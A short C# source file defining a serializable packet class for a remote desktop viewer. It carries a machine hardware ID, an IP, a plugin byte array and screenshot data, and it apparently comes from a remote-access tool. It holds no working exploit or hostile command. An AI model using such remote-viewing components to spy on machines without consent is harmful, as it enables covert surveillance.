using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteViewerPacket : IPacket
    {
        public RemoteViewerPacket(PacketType packetType) : base()
        {
            this.packetType = packetType;
        }

        public RemoteViewerPacket(PacketType packetType, string baseIp, string HWID) : base()
        {
            this.packetType = packetType;
            this.baseIp = baseIp;
            this.HWID = HWID;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public byte[] desktopPicture { get; set; }
        public int height { get; set; }
        public int width { get; set; }
        public int quality { get; set; }
        public string format { get; set; }
        public int timeMS { get; set; }

        public int vResol { get; set; }
        public int hResol { get; set; } 
    }
}
